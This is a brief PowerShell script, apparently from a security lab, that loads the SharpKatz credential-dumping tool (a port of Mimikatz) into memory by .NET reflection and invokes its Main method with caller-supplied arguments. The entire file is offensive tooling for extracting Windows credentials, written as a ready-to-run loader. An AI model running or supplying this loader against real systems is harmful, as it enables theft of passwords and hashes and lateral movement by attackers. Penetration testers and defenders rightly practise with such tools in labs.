$assemblyPath = "C:\THEV\Labs\PSloader\sharpkatz.exe"

try {
    # Load the assembly
    $null = [System.Reflection.Assembly]::LoadFrom($assemblyPath)

    # Invoke the Main method (adjust arguments as needed)
    $arguments = @("--Command") + $args # Example arguments
    [SharpKatz.Program]::Main($arguments)

    Write-Output "SharpKatz executed successfully."
}
catch {
    Write-Error "Error loading or executing SharpKatz: $_"
}